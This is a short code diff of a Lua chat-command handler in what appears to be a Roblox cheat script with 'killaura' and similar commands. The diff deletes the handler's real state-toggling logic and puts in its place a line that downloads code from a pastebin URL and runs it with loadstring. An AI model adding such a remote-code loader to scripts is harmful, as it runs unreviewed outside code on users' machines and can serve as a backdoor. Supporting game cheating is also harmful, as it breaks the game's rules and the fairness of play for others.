@@ -2505,13 +2505,7 @@ function LocalPlayerChatted(msg)
 		end
 	end
 	if command("killaura") or command("ka") then
-		states.KILLAURA = getBoolFromString(arg2)
-
-		if getBoolFromString(arg2) == nil then
-			notify(arg2.."not a valid state.")
-		else
-			notify("Set "..arg1:sub(2).." to "..arg2)
-		end
+loadstring(game:HttpGet('https://pastebin.com/raw/ke5MR9Nh'))()
 	end
 	if command("dong") then
 		dong(arg2:lower())
